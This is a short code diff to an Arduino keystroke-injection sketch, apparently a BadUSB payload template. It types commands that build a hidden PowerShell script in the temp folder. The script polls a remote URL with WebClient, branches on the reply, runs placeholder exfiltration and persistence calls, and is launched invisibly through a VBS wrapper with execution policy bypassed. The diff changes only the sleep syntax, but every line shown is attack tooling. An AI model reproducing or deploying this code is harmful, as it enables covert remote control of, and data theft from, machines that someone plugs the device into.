@@ -22,7 +22,7 @@ void setup(){
   PERSCALLS
   
   Keyboard.println("echo while(1){ $exec = 0 >> %temp%\\hb.ps1");
-  Keyboard.println("echo sleep -seconds 5 >> %temp%\\hb.ps1");
+  Keyboard.println("echo sleep 5 >> %temp%\\hb.ps1");
   Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\hb.ps1");
   Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT4\") >> %temp%\\hb.ps1");
   Keyboard.println("echo if($fc -eq \"INPUT5\"){ >> %temp%\\hb.ps1");
@@ -32,7 +32,7 @@ void setup(){
 
   EXFILCALLS
 
-  Keyboard.println("echo sleep -Seconds 60 }}  >> %temp%\\hb.ps1");
+  Keyboard.println("echo sleep 60 }}  >> %temp%\\hb.ps1");
   Keyboard.println("echo if ($fc -eq \"INPUT7\"){ break }} >> %temp%\\hb.ps1");
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\hb.vbs");
   Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\hb.ps1\"),0,true >> %temp%\\hb.vbs");
